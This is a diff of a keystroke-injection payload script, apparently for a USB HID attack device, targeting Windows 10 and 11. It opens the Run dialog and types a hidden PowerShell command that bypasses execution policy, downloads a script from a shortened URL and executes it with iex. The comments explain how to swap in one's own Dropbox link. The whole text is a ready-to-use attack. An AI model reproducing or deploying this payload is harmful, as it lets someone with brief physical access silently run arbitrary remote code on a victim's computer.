@@ -4,7 +4,7 @@ REM     Description: This payload will run a powershell script in the background
 REM     Target: Windows 10, 11
 GUI r
 DELAY 500
-STRING powershell -w h -NoP -NonI -Ep Bypass iwr shorturl.at/awHO3 | iex
+STRING powershell -w h -NoP -NonI -Ep Bypass irm shorturl.at/awHO3 | iex
 ENTER
 REM     Remember to replace the link with your DropBox shared link for the intended file to download
 REM     Also remember to replace ?dl=0 with ?dl=1 at the end of your link so it is executed properly
